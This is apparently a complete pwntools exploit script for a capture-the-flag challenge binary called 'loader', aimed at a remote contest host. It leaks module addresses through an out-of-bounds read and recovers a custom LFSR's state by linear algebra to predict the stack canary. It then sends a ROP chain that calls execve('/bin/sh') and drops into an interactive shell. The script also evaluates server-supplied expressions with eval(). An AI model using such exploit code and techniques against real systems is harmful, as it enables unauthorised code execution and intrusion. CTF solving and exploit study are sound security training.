#!/usr/bin/python
from pwn import *
import sys
from sage.all import *

LOCAL = True

HOST = b"fixedaslr.2022.ctfcompetition.com"
PORT = 1337
PROCESS = b"./loader"

def read_off(off):
	r.sendline(b"3")
	r.recvline()
	r.sendline(str(off).encode())
	r.recvuntil(b"score: ")
	LEAK = r.recvline()
	r.recvuntil(b"choice?\n")
	return int(LEAK)

def get_off(base, target):
	if target > base:
		return target-base
	else:
		return 0x10000000000000000-(base-target)//8

rand_state = 0

def rand_extract_bit(x):
    global rand_state
    return ((rand_state >> x) & 1)

def rand_get_bit():
    global rand_state
    v0 = rand_extract_bit(63)
    v1 = rand_extract_bit(61) ^ v0
    v1 = rand_extract_bit(60) ^ v1 
    v3 = v1 ^ rand_extract_bit(58) ^ 1 
    rand_state = ((2 * rand_state) | v3) % (1 << 64)
    return v3 

def get_rand(x):
    ret = 0
    for _ in range(x):
        ret = 2 * ret | rand_get_bit()
    return ret

def leaks_to_stack(leaks):
    global rand_state
    one_vec = vector(GF(2), [0] * 64 + [1])
    init = []
    for i in range(64):
        tt = vector(GF(2), [0] * 65)
        tt[i] = 1
        init.append(tt)
    for i in range(64):
        new_vec = init[63] + init[61] + init[60] + init[58] + one_vec
        for j in range(63, 0, -1):
            init[j] = init[j-1]
        init[0] = new_vec
    M = []
    fin = []
    for i in range(len(leaks)):
        for j in range(12):
            new_vec = init[63] + init[61] + init[60] + init[58] + one_vec
            for k in range(63, 0, -1):
                init[k] = init[k-1]
            init[0] = new_vec
            target = (leaks[i] >> (11 - j)) & 1
            fin.append(GF(2)(init[0][64] + target))
            ff = []
            for k in range(64):
                ff.append(init[0][k])
            M.append(ff)
    fin = vector(GF(2), fin)
    M = Matrix(GF(2), M)
    try:
        v = M.solve_right(fin)
        ret = 0
        for i in range(64):
            ret += int(v[i]) * (1 << i)
        rand_state = ret
        canary = get_rand(64)
        for _ in range(6):
            get_rand(12)
        final_leak = get_rand(12)
        return [canary, final_leak]
    except:
        pass

def play_until_score(target_score, payload):
	r.sendline("1")
	while 1:
		r.recvuntil("How much is ")
		expr = r.recvuntil(" ?\n", drop=True)
		res = eval(expr)
		r.sendline(str(res))
		r.recvuntil("You have ")
		score = int(r.recvuntil("pts", drop=True))

		if score >= target_score:
			break

	r.recvuntil("?\n")
	r.sendline("0")
	r.recvuntil("?\n")
	r.sendline(str(len(payload)))
	r.recvuntil("name:\n")	
	r.send(payload)

def exploit(r):
	r.recvuntil(b"choice?\n")

	LEAKMAIN = read_off(0x1000//8)
	MAINRW = LEAKMAIN - 0x60
	MAINRX = MAINRW - 0x2000
	
	print("main     : %s" % hex(MAINRX))
		
	GAMELEAK = read_off(get_off(MAINRW, MAINRX+8))
	GAMERX = GAMELEAK - 0x1111
	GAMERW = GAMERX + 0x2000
	
	print("game     : %s" % hex(GAMERX))

	BASICLEAK = read_off(get_off(MAINRW, GAMERX+8))
	BASICRX = BASICLEAK - 0x119c

	print("basic    : %s" % hex(BASICRX))

	GUARDLEAK = read_off(get_off(MAINRW, GAMERX+0x28))
	GUARDRX = GUARDLEAK - 0x1000

	print("guard    : %s" % hex(GUARDRX))

	RESLEAK = read_off(get_off(MAINRW, GAMERW))
	RESBASE = RESLEAK - 0x1000

	print("res      : %s" % hex(RESBASE))	

	SYSCALLSLEAK = read_off(get_off(MAINRW, BASICRX+0x38))
	SYSCALLSRX = SYSCALLSLEAK - 0x10ba

	print("syscalls : %s" % hex(SYSCALLSRX))

	REGIONS = [MAINRX, SYSCALLSRX, GUARDRX, BASICRX, GAMERX, RESBASE]

	leaks = list(map(lambda x: x >> 0x1c, REGIONS))

	CANARY, DEBUG = leaks_to_stack(leaks)
	DEBUG = DEBUG << 0x1c

	print("canary   : %s" % hex(CANARY))
	print("debug    : %s" % hex(DEBUG))

	POPRAX = DEBUG + 0x1007
	POPRDI = DEBUG + 0x1001
	POPRSI = DEBUG + 0x1004
	POPRDX = DEBUG + 0x1010
	SYSCALL = SYSCALLSRX + 0x1002
	
	payload = b"/bin/sh\x00"
	payload += b"A"*(40-len(payload))
	payload += p64(CANARY)
	payload += p64(0xdeadbeef)	
	payload += p64(POPRAX)
	payload += p64(59)
	payload += p64(POPRSI)
	payload += p64(0)
	payload += p64(POPRDX)
	payload += p64(0)
	payload += p64(SYSCALL)

	play_until_score(100, payload)

	r.interactive()
	
	return

if __name__ == "__main__":
	# e = ELF("./loader")

	if len(sys.argv) > 1:
		LOCAL = False
		r = remote(HOST, PORT)		
	else:
		LOCAL = True
		r = process("./loader")
		print (util.proc.pidof(r))
		pause()
	
	exploit(r)